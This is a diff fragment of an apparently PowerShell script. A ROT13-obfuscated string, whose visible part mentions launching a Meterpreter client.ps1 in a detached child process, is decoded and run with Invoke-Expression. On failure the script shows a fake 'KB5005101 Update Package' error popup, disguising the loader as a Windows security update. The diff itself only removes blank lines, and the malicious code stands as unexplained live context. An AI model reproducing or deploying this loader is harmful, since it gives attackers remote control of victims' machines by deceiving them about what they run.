@@ -23,8 +23,3 @@ gel{#Rkrphgr zrgrecrgre pyvrag.cf1 va n puvyq cebprff qrgnpu sebz cnerag cebprff
 }pngpu{}");$rdata = $null
 $Rotten13.ToCharArray() | ForEach-Object {If((([int] $_ -ge 97) -and ([int] $_ -le 109)) -or (([int] $_ -ge 65) -and ([int] $_ -le 77))){$rdata += [char] ([int] $_ + 13)}ElseIf((([int] $_ -ge 110) -and ([int] $_ -le 122)) -or (([int] $_ -ge 78) -and ([int] $_ -le 90))){$rdata += [char] ([int] $_ - 13)}Else{$rdata += $_}}
 try{echo "$rdata"|Invoke-Expression}catch{powershell (New-Object -ComObject Wscript.Shell).Popup("Fail to execute KB5005101.exe Update Package",5,"                           Secure KB5005101 Update",0+16)}
-
-
-
-
-
